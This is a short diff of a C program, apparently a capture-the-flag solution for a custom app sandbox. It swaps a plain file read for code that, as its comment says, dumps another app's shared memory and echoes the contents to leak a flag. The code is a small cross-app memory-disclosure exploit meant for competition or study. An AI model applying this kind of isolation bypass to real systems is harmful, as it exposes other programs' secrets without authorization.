@@ -3,11 +3,14 @@
 #include <string.h>
 
 int app_main() {
-    int fd = Xopen("flag1.papp");
-    uint32_t a = shm_alloc(0x10000);
-    int len = _read(fd, PARAM_AT(a), 0x10000);
+    // dump shared memory of other apps
+    // int svc = Xlookup("crypto");
+    int svc = 3; // flag1.papp
+    int size = 0x40000;
+    int a = shm_alloc(size);
+    memcpy(PARAM_AT(a), PARAM_FOR(svc), size);
     Xecho("BEGIN\n");
-    request(REQ_ECHO, a, len, 0, 0);
+    request(REQ_ECHO, a, size, 0, 0);
     Xecho("END\n");
     return 0;
 }
